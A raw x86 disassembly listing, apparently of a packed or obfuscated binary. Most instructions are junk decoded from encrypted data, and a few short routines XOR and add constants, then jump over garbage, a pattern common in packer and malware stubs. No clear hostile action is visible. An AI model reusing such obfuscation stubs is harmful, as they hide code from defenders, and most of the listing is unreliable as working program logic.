  410804:	dec    edx
  410805:	dec    ebx
  410806:	out    0xab,eax
  410808:	push   0x35943aa0
  41080d:	push   edx
  41080e:	enter  0x533b,0x42
  410812:	xor    DWORD PTR [edx],esp
  410814:	pop    es
  410815:	push   edx
  410816:	sar    BYTE PTR [eax-0x20],0xa0
  41081a:	push   edi
  41081b:	sub    al,0x76
  41081d:	xlat   BYTE PTR ds:[ebx]
  41081e:	sbb    eax,0x7a53c1d8
  410823:	dec    ecx
  410824:	(bad)
  410827:	test   DWORD PTR [eax],0xef293c43
  41082d:	in     al,dx
  41082e:	mov    ch,0xfc
  410830:	adc    al,0x8f
  410832:	and    al,0x1d
  410834:	pusha  
  410835:	push   eax
  410836:	int3   
  410837:	idiv   DWORD PTR [eax+ebx*4]
  41083a:	cmp    BYTE PTR [edi],dl
  41083c:	pop    esi
  41083d:	add    ebp,DWORD PTR ds:[ebp+0x74b4202b]
  410844:	sub    ebp,DWORD PTR [edi]
  410846:	test   al,0x11
  410848:	cmc    
  410849:	and    eax,0xf2d35c0d
  41084e:	dec    ebx
  41084f:	sub    al,0x74
  410851:	pop    esi
  410852:	mov    ecx,0x3acaaaaa
  410857:	loop   0x41084c
  410859:	mov    WORD PTR [esi],es
  41085b:	pop    es
  41085c:	jmp    0x21a6fcea
  410861:	clc    
  410862:	lds    edx,FWORD PTR [edi+0x1dcc59aa]
  410868:	pop    DWORD PTR [ecx]
  41086a:	test   eax,0x157e9cd3
  41086f:	pop    esp
  410870:	xchg   edx,eax
  410871:	or     BYTE PTR [esi+0x3],0x8d
  410875:	fstp   TBYTE PTR [esi+0x6d]
  410878:	cld    
  410879:	push   eax
  41087a:	cmp    al,0x4
  41087c:	add    al,0x2
  41087e:	cmp    esp,DWORD PTR [edx-0x1ee9348d]
  410884:	sbb    DWORD PTR [esi-0x2d864246],esp
  41088a:	push   0xc8835fa6
  41088f:	cmc    
  410890:	pop    ebp
  410891:	xchg   BYTE PTR [edi+0x7442a64a],bh
  410897:	pop    ecx
  410898:	dec    ebx
  410899:	arpl   WORD PTR [eax-0x5ebb24de],bp
  41089f:	mov    cl,0xb
  4108a1:	mov    bh,0x75
  4108a3:	lods   eax,DWORD PTR ds:[esi]
  4108a4:	mov    dh,0x44
  4108a6:	cmpxchg DWORD PTR [ebx-0x67],ecx
  4108aa:	mov    eax,ds:0xf56cba24
  4108af:	xor    eax,0x7f2e6d03
  4108b4:	dec    esi
  4108b5:	add    BYTE PTR [ebx+0x45],dl
  4108b8:	push   0xa4ca8b28
  4108bd:	push   ecx
  4108be:	shr    DWORD PTR [ecx-0x1ea61944],0x9f
  4108c5:	test   ecx,edx
  4108c7:	jne    0x410864
  4108c9:	fwait
  4108ca:	and    DWORD PTR [edx],eax
  4108cc:	cdq    
  4108cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108cf:	in     eax,0x44
  4108d1:	test   al,0x84
  4108d3:	scas   al,BYTE PTR es:[edi]
  4108d4:	sub    ebp,DWORD PTR [ecx-0x35]
  4108d7:	push   0x77d0e971
  4108dc:	mov    ecx,0x29e5b97d
  4108e1:	xchg   ebp,eax
  4108e2:	adc    al,0x90
  4108e4:	shl    BYTE PTR [esi-0x70],cl
  4108e7:	and    bh,cl
  4108e9:	xchg   esp,eax
  4108ea:	mov    dl,0x9c
  4108ec:	and    al,0xf
  4108ee:	(bad)  [edi-0x397ca422]
  4108f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108f5:	dec    eax
  4108f6:	icebp  
  4108f7:	jae    0x4108d9
  4108f9:	adc    BYTE PTR [esi],cl
  4108fb:	adc    edx,ecx
  4108fd:	(bad)  [esi]
  4108ff:	mov    WORD PTR [edx+0x2d8eb36f],ss
  410905:	mov    bl,0x7a
  410907:	(bad)  
  410908:	dec    esi
  410909:	pop    ebx
  41090a:	inc    esi
  41090b:	ss add eax,0xb08292c8
  410911:	int    0x9a
  410913:	jo     0x4108b8
  410915:	and    eax,0x7e954779
  41091a:	and    al,0x95
  41091c:	(bad)  
  41091e:	mov    cl,0xae
  410920:	enter  0x990b,0xa0
  410924:	out    0x8,al
  410926:	sti    
  410927:	pop    ds
  410928:	add    al,0x16
  41092a:	data16 jnp 0x41095b
  41092d:	jo     0x410949
  41092f:	push   DWORD PTR [ebp-0x16]
  410932:	mov    bh,0x9f
  410934:	jno    0x410955
  410936:	aaa    
  410937:	aas    
  410938:	lahf   
  410939:	rcl    BYTE PTR [edx-0x6c8d163f],cl
  41093f:	or     al,0xd7
  410941:	jae    0x41092f
  410943:	jp     0x410934
  410945:	mov    cl,0x1d
  410947:	outs   dx,DWORD PTR ds:[esi]
  410948:	and    BYTE PTR [eax+esi*4],al
  41094b:	push   ss
  41094c:	rcl    dh,1
  41094e:	mov    al,ds:0x2a1ffebc
  410953:	xor    eax,0xb59f0a12
  410958:	pop    ds
  410959:	mov    edi,0x6257e064
  41095e:	jo     0x41097b
  410960:	sbb    al,0x2d
  410962:	xchg   BYTE PTR [eax+0x43],dl
  410965:	adc    ah,BYTE PTR [esi+0xa2dd28b]
  41096b:	lods   al,BYTE PTR ds:[esi]
  41096c:	adc    DWORD PTR [edi-0x18],ebp
  41096f:	or     al,0xe4
  410971:	mov    al,0x68
  410973:	or     cl,dl
  410975:	(bad)
  410979:	mov    gs,WORD PTR [ebx]
  41097b:	gs aaa 
  41097d:	int    0xe8
  41097f:	stos   DWORD PTR es:[edi],eax
  410980:	or     ecx,DWORD PTR [ecx]
  410982:	popf   
  410983:	fcmovnbe st,st(7)
  410985:	add    DWORD PTR [ebp-0x3b229144],esp
  41098b:	pop    ds
  41098c:	xchg   edx,eax
  41098d:	mov    bh,0x52
  41098f:	aaa    
  410990:	call   0x2dec250f
  410995:	pop    eax
  410996:	adc    edi,esp
  410998:	mov    ds:0x10a7894e,al
  41099d:	adc    BYTE PTR [ebp-0xa],cl
  4109a0:	cwde   
  4109a1:	add    BYTE PTR [edx-0x54],al
  4109a4:	sub    BYTE PTR [edx],ah
  4109a6:	dec    ebx
  4109a7:	fsub   QWORD PTR [ebx+0x2616e443]
  4109ad:	test   al,0xf9
  4109af:	pop    esp
  4109b0:	mov    BYTE PTR [ebp+0x49],ch
  4109b3:	dec    ecx
  4109b4:	lea    ebp,[edx-0x2cd233c1]
  4109ba:	test   BYTE PTR [esi-0xf72c5d1],0xbc
  4109c1:	neg    DWORD PTR [ecx]
  4109c3:	pop    ebp
  4109c4:	test   al,0x75
  4109c6:	jmp    0x661e:0x9bf0ccc7
  4109cd:	xlat   BYTE PTR ds:[ebx]
  4109ce:	imul   ebp,edi,0x99cae909
  4109d4:	mov    cl,0xfc
  4109d6:	js     0x4109fc
  4109d8:	jno    0x41099b
  4109da:	push   edx
  4109db:	jge    0x4109a1
  4109dd:	jge    0x4109ec
  4109df:	mov    ecx,DWORD PTR [edi+0x4a]
  4109e2:	fdiv   DWORD PTR [ecx-0x619afc13]
  4109e8:	cdq    
  4109e9:	mov    ch,0x76
  4109eb:	jns    0x410a4e
  4109ed:	push   cs
  4109ee:	jle    0x4109b0
  4109f0:	sub    eax,0xaa0cc725
  4109f5:	repz cmp al,BYTE PTR [edi-0x3b]
  4109f9:	ja     0x4109e4
  4109fb:	clc    
  4109fc:	mov    ch,0x2
  4109fe:	(bad)  
  410a00:	mov    esi,0x65bfda9
  410a05:	mov    ch,0xe9
  410a07:	mov    esp,0x9d98367a
  410a0c:	mov    dh,0x95
  410a0e:	mov    dh,0x7f
  410a10:	pop    edi
  410a11:	sbb    edx,DWORD PTR [esp+ebx*1+0x78]
  410a15:	or     eax,0xb8e5e6e0
  410a1a:	ss jno 0x410a90
  410a1d:	dec    esi
  410a1e:	fisub  WORD PTR [esi]
  410a20:	lahf   
  410a21:	fild   DWORD PTR [ecx*8+0x2165359]
  410a28:	mov    ds:0x33efbafc,al
  410a2d:	popf   
  410a2e:	xchg   edx,eax
  410a2f:	mov    bl,0x4b
  410a31:	push   es
  410a32:	sub    bl,BYTE PTR [esi+0x32]
  410a35:	mov    ecx,0x84947dac
  410a3a:	inc    esp
  410a3b:	sbb    eax,DWORD PTR [edx]
  410a3d:	adc    al,0x67
  410a3f:	push   ecx
  410a40:	in     al,dx
  410a41:	jle    0x410a8c
  410a43:	sbb    dh,BYTE PTR [eax-0x5841cc69]
  410a49:	jae    0x4109eb
  410a4b:	pushf  
  410a4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a4d:	push   edx
  410a4e:	mov    ch,0x6e
  410a50:	xchg   esi,eax
  410a51:	push   esp
  410a52:	aas    
  410a53:	dec    ecx
  410a54:	pop    ebx
  410a55:	test   DWORD PTR [edi+0x63],esp
  410a58:	dec    BYTE PTR [ebx-0x5f]
  410a5b:	and    al,0xc9
  410a5d:	push   esi
  410a5e:	in     al,0x99
  410a60:	adc    al,0xf7
  410a62:	ja     0x410a71
  410a64:	and    esi,esi
  410a66:	sub    DWORD PTR [ecx-0x2f89347b],ecx
  410a6c:	jmp    0xd047:0x86c2c76a
  410a73:	mov    esp,0x1e8a5932
  410a78:	mov    al,ds:0xd0228436
  410a7d:	aam    0x52
  410a7f:	inc    BYTE PTR [ebx+ebp*8+0x74]
  410a83:	test   BYTE PTR [ecx-0x21],dl
  410a86:	push   0x4c9fd674
  410a8b:	pop    ebx
  410a8c:	xor    al,0xbb
  410a8e:	lea    esi,[ebx+0x38af27f0]
  410a94:	adc    ecx,0xe9d0c650
  410a9a:	outs   dx,BYTE PTR ds:[esi]
  410a9b:	(bad)  
  410a9c:	out    0x97,al
  410a9e:	jnp    0x410a58
  410aa0:	fxtract 
  410aa2:	mov    eax,ds:0x6f4d3191
  410aa7:	push   ebp
  410aa8:	aam    0x91
  410aaa:	jl     0x410a67
  410aac:	cli    
  410aad:	xor    al,0x18
  410aaf:	ja     0x410a66
  410ab1:	ss jl  0x410aea
  410ab4:	dec    BYTE PTR es:[ecx-0x4453e8e2]
  410abb:	adc    DWORD PTR [ecx-0x42],0xad9c083b
  410ac2:	es and cl,al
  410ac5:	adc    eax,0xd613dc1
  410aca:	outs   dx,DWORD PTR ds:[esi]
  410acb:	xchg   esi,eax
  410acc:	retf   0x687d
  410acf:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  410ad1:	or     al,0x5f
  410ad3:	cwde   
  410ad4:	push   ss
  410ad5:	or     eax,ecx
  410ad7:	sub    dh,bh
  410ad9:	sbb    edx,DWORD PTR [ebx]
  410adb:	mov    edx,es
  410add:	and    eax,0x30025cd
  410ae2:	xor    ecx,edx
  410ae4:	or     dh,BYTE PTR [edx]
  410ae6:	push   edx
  410ae7:	xlat   BYTE PTR ds:[ebx]
  410ae8:	or     DWORD PTR [eax+eax*1-0x54],ebp
  410aec:	push   ecx
  410aed:	push   ebx
  410aee:	icebp  
  410aef:	pop    esp
  410af0:	and    BYTE PTR [eax+0x1fd4c37c],cl
  410af6:	(bad)  
  410af7:	(bad)  
  410af8:	sub    BYTE PTR [esi-0x79],al
  410afb:	out    0x26,eax
  410afd:	push   ss
  410afe:	fist   DWORD PTR [ecx-0x9215ec5]
  410b04:	int    0x1c
  410b06:	pusha  
  410b07:	inc    BYTE PTR [edx-0x26]
  410b0a:	nop
  410b0b:	xor    edi,DWORD PTR [ebp+0x9]
  410b0e:	call   0x5fc55de8
  410b13:	lea    edx,[ebx+0x71c28911]
  410b19:	xchg   edi,eax
  410b1a:	outs   dx,BYTE PTR cs:[esi]
  410b1c:	bound  eax,QWORD PTR [edi]
  410b1e:	mov    eax,DWORD PTR [ebx-0x39]
  410b21:	loopne 0x410b35
  410b23:	and    DWORD PTR [ecx+0x32d232d9],esi
  410b29:	jmp    0x410b5c
  410b2b:	xchg   ecx,eax
  410b2c:	xchg   esp,eax
  410b2d:	add    eax,ebx
  410b2f:	xchg   BYTE PTR [ebp+0x63],al
  410b32:	sar    DWORD PTR [esi+eiz*4],cl
  410b35:	xor    eax,0x99ece828
  410b3a:	in     eax,0x9
  410b3c:	stc    
  410b3d:	xchg   DWORD PTR [ebx-0x38],ebx
  410b40:	mov    BYTE PTR [esi+eiz*8-0x5ae0131e],cl
  410b47:	add    esi,ebx
  410b49:	enter  0x2045,0xd9
  410b4d:	and    eax,0xfb112c00
  410b52:	mov    bh,0x2d
  410b54:	inc    esi
  410b55:	push   0xffffff8a
  410b57:	jge    0x410bb8
  410b59:	lds    esp,FWORD PTR [eax]
  410b5b:	pop    ss
  410b5c:	dec    ebx
  410b5d:	jns    0x410b31
  410b5f:	inc    edx
  410b60:	xchg   esp,eax
  410b61:	cmp    DWORD PTR [esi+0x54],eax
  410b64:	pop    esi
  410b65:	je     0x410b73
  410b6b:	mov    eax,DWORD PTR [ebp+0x8]
  410b6e:	jmp    0x410b8c
  410b73:	mov    eax,DWORD PTR [ebp-0x4]
  410b76:	xor    eax,edx
  410b78:	add    eax,ecx
  410b7a:	jmp    0x410b8c
  410b7f:	mov    eax,DWORD PTR [ebp-0x4]
  410b82:	xor    eax,0x7510855
  410b87:	add    eax,0x32729c
  410b8c:	leave  
  410b8d:	ret    0x4
  410b90:	push   ebp
  410b91:	mov    ebp,esp
  410b93:	jmp    0x410f98
  410b98:	outs   dx,DWORD PTR ds:[esi]
  410b99:	mov    WORD PTR ds:0x7191e994,cs
  410b9f:	jae    0x410bc2
  410ba1:	dec    esi
  410ba2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ba3:	repz out 0x62,al
  410ba6:	sti    
  410ba7:	xor    edi,DWORD PTR [esi]
  410ba9:	inc    edx
  410baa:	jo     0x410c1c
  410bac:	pop    eax
  410bad:	jge    0x410c1f
  410baf:	jo     0x410bbb
  410bb1:	out    dx,eax
  410bb2:	push   0x23ba4f4d
  410bb7:	ficom  WORD PTR [ecx]
  410bb9:	add    ch,BYTE PTR [ecx+0x6dae649e]
  410bbf:	icebp  
  410bc0:	push   ss
  410bc1:	adc    al,0xcd
  410bc3:	fucomi st,st(5)
  410bc5:	stos   DWORD PTR es:[edi],eax
  410bc6:	add    DWORD PTR [eax+0x52],ebx
  410bc9:	gs mov al,0x48
  410bcc:	push   es
  410bcd:	push   eax
  410bce:	lods   eax,DWORD PTR ds:[esi]
  410bcf:	dec    esp
  410bd0:	inc    eax
  410bd1:	pusha  
  410bd2:	sbb    cl,BYTE PTR [ecx+0x17b4a6ad]
  410bd8:	mov    ebx,0x3be0cb36
  410bdd:	jns    0x410bc5
  410bdf:	lahf   
  410be0:	call   0x149b:0x3702d12
  410be7:	sub    ebx,eax
  410be9:	cmp    eax,0xfdd0dd56
  410bee:	sub    ebx,edx
  410bf0:	jg     0x410ba7
  410bf2:	stos   BYTE PTR es:[edi],al
  410bf3:	clc    
  410bf4:	jbe    0x410c4b
  410bf6:	cdq    
  410bf7:	je     0x410c48
  410bf9:	in     eax,0xdc
  410bfb:	ror    ebx,1
  410bfd:	jg     0x410bce
  410bff:	arpl   WORD PTR [ecx+0x1e68812e],bp
  410c05:	push   ebx
  410c06:	push   DWORD PTR [ebp+ecx*1-0x4f]
  410c0a:	pop    esp
  410c0b:	mov    DWORD PTR [edx],ebx
  410c0d:	xchg   ebp,eax
  410c0e:	loopne 0x410bb6
  410c10:	mov    ecx,0xb7a67d98
  410c15:	jmp    0x26d1baa
  410c1a:	aam    0x86
  410c1c:	dec    edx
  410c1d:	xor    DWORD PTR ds:0x40de5122,0x5b
  410c24:	into   
  410c25:	jns    0x410c18
  410c27:	scas   eax,DWORD PTR es:[edi]
  410c28:	jbe    0x410c3a
  410c2a:	ror    BYTE PTR [ecx+0x7c],0x8
  410c2e:	adc    edx,DWORD PTR [edx+edx*8]
  410c31:	(bad)  
  410c33:	loopne 0x410c64
  410c35:	xor    eax,0xabdf56de
  410c3a:	fwait
  410c3b:	xor    al,cl
  410c3d:	aad    0xa6
  410c3f:	mov    bl,0x58
  410c41:	stos   DWORD PTR es:[edi],eax
  410c42:	test   DWORD PTR [ebp-0x3426510a],ebx
  410c48:	cdq    
  410c49:	cmc    
  410c4a:	cli    
  410c4b:	cwde   
  410c4c:	xacquire xchg BYTE PTR [esi-0x58],dl
  410c50:	push   ebp
  410c51:	jp     0x410c76
  410c53:	sti    
  410c54:	inc    ecx
  410c55:	xor    eax,0x5c3fa164
  410c5a:	lods   eax,DWORD PTR ds:[esi]
  410c5b:	test   ecx,ebp
  410c5d:	xchg   edi,eax
  410c5e:	sub    al,0xbe
  410c60:	test   al,0x81
  410c62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c63:	fimul  WORD PTR [edi-0x20]
  410c66:	std    
  410c67:	jbe    0x410bf0
  410c69:	retf   0x8293
  410c6c:	inc    ecx
  410c6d:	in     eax,0x2d
  410c6f:	ja     0x410bfe
  410c71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c72:	ja     0x410c78
  410c74:	xor    al,0x2d
  410c76:	xor    edx,ecx
  410c78:	loopne 0x410c6f
  410c7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c7b:	adc    eax,0xf9d654e5
  410c80:	dec    esi
  410c81:	ds (bad) 
  410c83:	mov    eax,ds:0x4744d794
  410c88:	ds shr esp,0xeb
  410c8c:	outs   dx,BYTE PTR ds:[esi]
  410c8d:	sub    al,0x88
  410c8f:	lock sbb al,0xe8
  410c92:	mov    cl,0x8a
  410c94:	mov    al,ds:0x36302e73
  410c99:	mov    dh,0xc8
  410c9b:	scas   al,BYTE PTR es:[edi]
  410c9c:	fidivr WORD PTR [edx-0x6f04e627]
  410ca2:	jns    0x410ca0
  410ca4:	ja     0x410c7c
  410ca6:	(bad)  
  410ca7:	push   cs
  410ca8:	add    dh,BYTE PTR [ecx-0x3e]
  410cab:	out    dx,al
  410cac:	dec    edx
  410cad:	dec    ebp
  410cae:	ror    BYTE PTR [ebx],1
  410cb0:	xor    al,0x4e
  410cb2:	aas    
  410cb3:	inc    esp
  410cb4:	div    DWORD PTR es:[ebp-0x66a9cd6c]
  410cbb:	mov    ecx,0x40f7f1c0
  410cc0:	(bad)  
  410cc1:	mov    dl,0xab
  410cc3:	mov    ebx,0xe24fd808
  410cc8:	cmp    DWORD PTR [edx-0x5ccb7e00],0xffffffa7
  410ccf:	paddsb mm6,QWORD PTR [ebx]
  410cd2:	pop    ebx
  410cd3:	push   ds
  410cd4:	loop   0x410ca8
  410cd6:	adc    BYTE PTR [eax-0x24a8632e],cl
  410cdc:	mov    WORD PTR [eax],?
  410cde:	inc    ebx
  410cdf:	pop    esi
  410ce0:	std    
  410ce1:	jns    0x410cdb
  410ce3:	mov    ebp,0xf5c20de0
  410ce8:	mov    dl,ch
  410cea:	or     al,0xe7
  410cec:	push   ss
  410ced:	mov    eax,DWORD PTR [ecx]
  410cef:	mov    bh,0x2e
  410cf1:	jge    0x410d29
  410cf3:	cdq    
  410cf4:	adc    BYTE PTR [esi+0x5],dh
  410cf7:	jg     0x410ce8
  410cf9:	cmp    DWORD PTR [edx],esi
  410cfb:	out    dx,eax
  410cfc:	lahf   
  410cfd:	push   ebp
  410cfe:	push   ss
  410cff:	mov    ah,0xc7
  410d01:	mov    dl,0x6d
  410d03:	push   esi
  410d04:	outs   dx,BYTE PTR ds:[esi]
  410d05:	out    dx,eax
  410d06:	cmp    ch,bh
  410d08:	popf   
  410d09:	clc    
  410d0a:	jecxz  0x410d82
  410d0c:	pop    ebp
  410d0d:	call   0x5854:0x74b0d8f0
  410d14:	shl    BYTE PTR [ecx+0x37],1
  410d17:	idiv   esp
  410d19:	pop    ecx
  410d1a:	out    dx,al
  410d1b:	outs   dx,DWORD PTR ds:[esi]
  410d1c:	or     al,0x43
  410d1e:	or     ebp,DWORD PTR [ecx-0x7bda5f15]
  410d24:	ffreep st(4)
  410d26:	stos   BYTE PTR es:[edi],al
  410d27:	sub    BYTE PTR [ebx],bh
  410d29:	cmp    al,BYTE PTR cs:[edi+0x58805596]
  410d30:	je     0x410cf1
  410d32:	push   ebx
  410d33:	cdq    
  410d34:	inc    edx
  410d35:	mov    edx,0xf8f268bc
  410d3a:	mov    eax,0x3c956239
  410d3f:	das    
  410d40:	mov    ch,0x76
  410d42:	test   al,0x8f
  410d44:	retf   0xda47
  410d47:	ja     0x410ce3
  410d49:	xor    eax,0xce9cebfe
  410d4e:	mov    dl,0xa8
  410d50:	dec    esp
  410d51:	add    DWORD PTR [edx-0xa],0xc348c0e3
  410d58:	es xchg ecx,eax
  410d5a:	pop    ebx
  410d5b:	mov    ds:0x1da39fe8,eax
  410d60:	adc    DWORD PTR [ebx],ebp
  410d62:	and    DWORD PTR [esi+eax*8+0x7052f29e],esi
  410d69:	mov    dh,0x33
  410d6b:	xor    BYTE PTR [esi],dh
  410d6d:	add    al,0xde
  410d6f:	xchg   ebx,eax
  410d70:	(bad)  
  410d71:	aas    
  410d72:	sub    ebx,edx
  410d74:	test   al,0x76
  410d76:	mov    ecx,0xebe55d5e
  410d7b:	sbb    al,0x9f
  410d7d:	cld    
  410d7e:	mov    ecx,DWORD PTR [eax+0x592afe31]
  410d84:	cmp    DWORD PTR [esi+0x65f0c11],ebp
  410d8a:	js     0x410d7c
  410d8c:	push   0xfa0e4e32
  410d91:	clc    
  410d92:	xchg   ebx,eax
  410d93:	sbb    al,0x42
  410d95:	add    ch,BYTE PTR [eax-0x23d5b82e]
  410d9b:	rcl    DWORD PTR [edx+0x1],1
  410d9e:	or     eax,0x7dc01944
  410da3:	cmp    BYTE PTR [eax+0x5d],0xfc
  410da7:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  410da9:	jnp    0x410dd5
  410dab:	in     eax,0x25
  410dad:	dec    eax
  410dae:	(bad)  
  410daf:	test   DWORD PTR [ecx+0x4fe01e6e],0xe09967c
  410db9:	adc    DWORD PTR [ebx+0x6899d6e4],0x233b3da
  410dc3:	fld    QWORD PTR [esi+0x16]
  410dc6:	js     0x410d58
  410dc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410dc9:	push   0xa2c9b4f0
  410dce:	dec    esi
  410dcf:	das    
  410dd0:	jnp    0x410d9f
  410dd2:	enter  0xe1d7,0xac
  410dd6:	pusha  
  410dd7:	cmp    ah,BYTE PTR [ebx-0x35]
  410dda:	mov    ah,0x66
  410ddc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ddd:	mov    edi,0x1eda3fdc
  410de2:	jb     0x410d94
  410de4:	or     DWORD PTR [ebp+0x74b62dc],edx
  410dea:	aaa    
  410deb:	and    al,BYTE PTR [ebx+0x4f]
  410dee:	adc    bh,bl
  410df0:	imul   ebx,DWORD PTR [edi-0xa],0xc
  410df4:	lar    esi,cx
  410df7:	shl    bh,0x7e
  410dfa:	or     eax,0x1c8cdd8
  410dff:	pop    eax
  410e00:	fldl2e 
  410e02:	cwde   
  410e03:	(bad)
  410e06:	call   0x5d4b128
  410e0b:	aad    0x4a
  410e0d:	test   BYTE PTR [ebx+0xe],dh
  410e10:	and    dh,BYTE PTR [edx]
  410e12:	jno    0x410d95
  410e14:	lock or esi,DWORD PTR [ebx+0xb8ee11d]
  410e1b:	aam    0x80
  410e1d:	adc    al,0x49
  410e1f:	ins    DWORD PTR es:[edi],dx
  410e20:	and    eax,0x40dcf9ee
  410e25:	dec    esi
  410e26:	jp     0x410e98
  410e28:	dec    edx
  410e29:	pop    es
  410e2a:	mov    dl,0x55
  410e2c:	dec    ebx
  410e2d:	lods   al,BYTE PTR ds:[esi]
  410e2e:	mov    eax,0x2008f89d
  410e33:	jmp    0xaac74fc1
  410e38:	or     ah,ah
  410e3a:	push   eax
  410e3b:	leave  
  410e3c:	fsub   st,st(4)
  410e3e:	pop    ebp
  410e3f:	mov    bh,0xb4
  410e41:	push   esp
  410e42:	mov    ebp,0x14b6796f
  410e47:	(bad)  
  410e48:	fsub   st(6),st
  410e4a:	popf   
  410e4b:	cmp    eax,0x56dfb36e
  410e50:	cdq    
  410e51:	jp     0x410e16
  410e53:	fsub   DWORD PTR [edx+0x3d]
  410e56:	and    al,0x71
  410e58:	data16 mov dl,0xfb
  410e5b:	add    al,0xb4
  410e5d:	add    BYTE PTR [ebx-0x74],dl
  410e60:	pusha  
  410e61:	int    0xbf
  410e63:	inc    ecx
  410e64:	mov    dh,0x5d
  410e66:	ret    0x141a
  410e69:	mov    eax,ds:0x647686be
  410e6e:	mov    ecx,0x848465b8
  410e73:	cmp    eax,0xebad200f
  410e78:	mov    dh,0xd7
  410e7a:	ja     0x410e48
  410e7c:	dec    ecx
  410e7d:	dec    edx
  410e7e:	xchg   esi,eax
  410e7f:	mov    al,ds:0xe7c644f5
  410e84:	mov    ebp,0xa4adc0a8
  410e89:	outs   dx,DWORD PTR ds:[esi]
  410e8a:	fisubr WORD PTR [edi+0x6c659d26]
  410e90:	mov    ecx,0x65f4779
  410e95:	loop   0x410e46
  410e97:	jle    0x410e58
  410e99:	jae    0x410f00
  410e9b:	adc    eax,0xa4aefbe1
  410ea0:	xchg   edi,eax
  410ea1:	repz mov eax,ebx
  410ea4:	lea    ebx,[esi+0x3fa27e6b]
  410eaa:	sbb    dh,al
  410eac:	and    al,0x3c
  410eae:	iret   
  410eaf:	nop
  410eb0:	cmp    DWORD PTR ds:0xa5076f42,esi
  410eb6:	ficom  WORD PTR [eax+0x2a1a2220]
  410ebc:	stos   DWORD PTR es:[edi],eax
  410ebd:	cmp    DWORD PTR [esi-0x81cd53e],edx
  410ec3:	jo     0x410f43
  410ec5:	inc    ebp
  410ec6:	mov    ah,0x60
  410ec8:	js     0x410eda
  410eca:	cmp    esp,DWORD PTR [ecx]
  410ecc:	mul    DWORD PTR [edx-0x79]
  410ecf:	rcr    ah,1
  410ed1:	push   ecx
  410ed2:	fcom   DWORD PTR [ebx]
  410ed4:	idiv   BYTE PTR [esi+0x668808b]
  410eda:	jbe    0x410ec7
  410edc:	ficom  WORD PTR [ebx-0x22]
  410edf:	cmp    DWORD PTR [esi-0x7d099aac],ebp
  410ee5:	jmp    0x410eaf
  410ee7:	jmp    0xdc1b:0x34121d8
  410eee:	mov    al,BYTE PTR [esi]
  410ef0:	les    esp,FWORD PTR [esi]
  410ef2:	cdq    
  410ef3:	clc    
  410ef4:	popf   
  410ef5:	icebp  
  410ef6:	ror    BYTE PTR [eax-0x1f7e7e48],0x14
  410efd:	sub    eax,0xca3b968a
  410f02:	add    al,0x99
  410f04:	(bad)  
  410f06:	lods   eax,DWORD PTR cs:[esi]
  410f08:	stos   BYTE PTR es:[edi],al
  410f09:	ret    0x7d14
  410f0c:	mov    cl,0x7d
  410f0f:	jg     0x410f87
  410f11:	mov    ah,0x10
  410f13:	sbb    BYTE PTR [eax],0xde
  410f16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f17:	popa   
  410f18:	mov    bh,0x61
  410f1a:	and    BYTE PTR [esi+edi*2],al
  410f1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f1e:	pop    esi
  410f1f:	ins    BYTE PTR es:[edi],dx
  410f20:	mov    ebx,DWORD PTR [ebx]
  410f22:	pop    ss
  410f23:	jge    0x410f50
  410f25:	popa   
  410f26:	jmp    0x45dc86ab
  410f2b:	test   al,0xe8
  410f2d:	xchg   esp,eax
  410f2e:	xor    dl,BYTE PTR [esi]
  410f30:	add    DWORD PTR [ecx+0x5b],esp
  410f33:	push   edx
  410f34:	mov    WORD PTR [ebp-0x7d],gs
  410f37:	jns    0x410f25
  410f39:	pop    ebp
  410f3a:	fisub  DWORD PTR [ecx]
  410f3c:	add    DWORD PTR [edi],edi
  410f3e:	add    DWORD PTR [eax-0x7e6377b9],eax
  410f44:	mov    cl,0x98
  410f46:	xor    eax,0xde1b6810
  410f4b:	imul   esp,DWORD PTR [edx],0xffffffb9
  410f4e:	push   esi
  410f4f:	jp     0x410fca
  410f51:	jp     0x410f64
  410f53:	imul   ebp,DWORD PTR [esi],0xbd43094c
  410f59:	push   ds
  410f5a:	mov    bl,0xa0
  410f5c:	mov    bl,0xf1
  410f5e:	lar    edx,WORD PTR [eax+0x58]
  410f62:	repz xchg edi,eax
  410f64:	(bad)  
  410f65:	add    eax,0xd3bc9553
  410f6a:	fimul  WORD PTR [edi]
  410f6c:	push   0xa39a5664
  410f71:	(bad)  
  410f73:	dec    eax
  410f74:	repnz pop es
  410f76:	pop    ebx
  410f77:	into   
  410f78:	push   es
  410f79:	mov    DWORD PTR [edx+0x35],edi
  410f7c:	fld    DWORD PTR [ebx-0x7150838c]
  410f82:	arpl   WORD PTR [ecx-0x5860ea1d],di
  410f88:	in     al,0xe6
  410f8a:	or     bl,BYTE PTR [esi]
  410f8c:	enter  0xd015,0xdf
  410f90:	aam    0xef
  410f92:	sbb    edx,DWORD PTR [edi]
  410f94:	fadd   QWORD PTR [edi+0x62]
  410f97:	mov    BYTE PTR [ecx+0x41b22c],ah
  410f9d:	mov    edx,0x32729c
  410fa2:	sub    eax,edx
  410fa4:	adc    DWORD PTR ds:0x42fd6e,ebx
  410faa:	mov    ecx,0x7510855
  410faf:	push   esi
  410fb0:	mov    esi,DWORD PTR [ebp+0xc]
  410fb3:	xor    eax,ecx
  410fb5:	mov    DWORD PTR ds:0x42e11c,0x4b31
  410fbf:	jmp    0x4113c4
  410fc4:	xchg   edx,eax
  410fc5:	shl    DWORD PTR [edi+eiz*8+0x71516771],cl
  410fcc:	push   ebp
  410fcd:	paddsw mm6,QWORD PTR [eax-0x72d2b7f]
  410fd4:	es dec esi
  410fd6:	jo     0x411048
  410fd8:	pop    eax
  410fd9:	jge    0x41104b
  410fdb:	jo     0x410f75
  410fdd:	mov    ch,0x96
  410fdf:	mov    al,0x9c
